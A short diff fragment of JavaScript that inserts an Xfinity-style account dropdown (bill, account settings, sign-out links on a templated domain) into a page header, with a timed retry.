+        aria-haspopup="true" aria-expanded="false"></button> <span class="xc-header--dropdown-profile-address"></span><ul class="xc-header--dropdown-ul" data-hide="" hidden=""><li class="xc-header--dropdown-li xc-maw--billing"><a class="xc-header--dropdown-link" name="view my bill" href="https://customer.{domain}/#/billing">View My Bill</a></li><li class="xc-header--dropdown-li xc-maw--account"><a class="xc-header--dropdown-link" name="account settings" href="https://customer.{domain}/#/settings/account">Account Settings</a></li><li class="xc-header--dropdown-li"><a class="xc-header--dropdown-link xc-header--signin-signout-link" href="https://oauth.{domain}/oauth/sp-logout?client_id=my-xfinity">Sign Out</a></li></ul></div></div></div>
+        `;
+        document.getElementsByClassName("xc-header--container")[0].appendChild(div);
+        return;
+      }  
+      setTimeout(function(){ lp(); }, 3000);
